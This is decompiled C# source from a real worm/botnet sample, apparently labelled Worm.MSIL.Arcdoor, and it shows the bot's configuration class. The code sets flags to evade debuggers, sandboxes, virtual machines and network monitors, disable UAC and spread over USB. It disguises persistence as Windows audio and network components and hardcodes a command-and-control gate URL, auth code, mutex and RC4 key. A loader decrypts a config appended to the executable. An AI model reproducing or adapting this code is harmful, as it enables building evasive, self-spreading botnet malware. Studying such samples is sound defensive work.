// Decompiled with JetBrains decompiler
// Type: SysDriver.cConfig
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A26C35F-BA28-4E81-84A7-2E70BFB0BF2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Arcdoor.rd-c1c8aa0e1c017af03529dea9d73a38478f6fd04477b4a68c5889f87bb96df945.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace SysDriver
{
  internal class cConfig
  {
    public bool bAntiCain = true;
    public bool bAntiSandboxie = true;
    public bool bAntiDebugger = true;
    public bool bAntiEmulator = true;
    public bool bAntiFilemon = true;
    public bool bAntiNetstat = true;
    public bool bAntiNetworkmon = true;
    public bool bAntiParallelsDesktop = true;
    public bool bAntiProcessmon = true;
    public bool bAntiRegmon = true;
    public bool bAntiTCPView = true;
    public bool bAntiVirtualBox = true;
    public bool bAntiVirtualPC = true;
    public bool bAntiVMWare = true;
    public bool bAntiWireshark = true;
    public bool bDisableUAC = true;
    public string[] sFileName = new string[2]
    {
      "audiohd.exe",
      "WUDHost.exe"
    };
    public string[] sRegName = new string[2]
    {
      "Windows Audio Driver",
      "Windows-Network Component"
    };
    public string[] sFilePath = new string[2];
    public string sCServerAddress = string.Empty;
    public string sMutex = string.Empty;
    public string sAuthCode = string.Empty;
    public string sBotVersion = "1.2.0.0";
    public int iConnectionInterval = 0;
    public int iPersistentInterval = 30;
    public string sHWID = string.Empty;
    public string sWinVersion = string.Empty;
    public string sPCName = Environment.MachineName;
    public bool bAdminStatus = false;
    public bool bUSBSpread = true;
    private string sSplit = "XPADDINGX";
    private string sCryptPW = "N0PE";

    public cConfig()
    {
      this.sCServerAddress = "http://92.241.190.131/bn2/gate.php";
      this.sAuthCode = "uHx4593jH337ghDx";
      this.sMutex = "G5ZuOYShbvNrcb";
      this.iConnectionInterval = 60;
    }

    private void loadInfos()
    {
      string empty = string.Empty;
      StreamReader streamReader = new StreamReader(Process.GetCurrentProcess().MainModule.FileName.ToString());
      string end = streamReader.ReadToEnd();
      streamReader.Close();
      try
      {
        byte[] bData = Convert.FromBase64String(end.Substring(end.Length - 460, 460).Replace(Convert.ToChar(0), Convert.ToChar(32)).Trim());
        cCrypt.RC4(ref bData, this.sCryptPW);
        string[] strArray = Encoding.Default.GetString(bData).Split(new string[1]
        {
          this.sSplit
        }, StringSplitOptions.None);
        this.sCServerAddress = strArray[1];
        this.iConnectionInterval = int.Parse(strArray[2].Trim());
        this.sAuthCode = strArray[3].Trim();
        this.sMutex = strArray[4].Trim();
      }
      catch
      {
        Environment.Exit(0);
      }
    }
  }
}
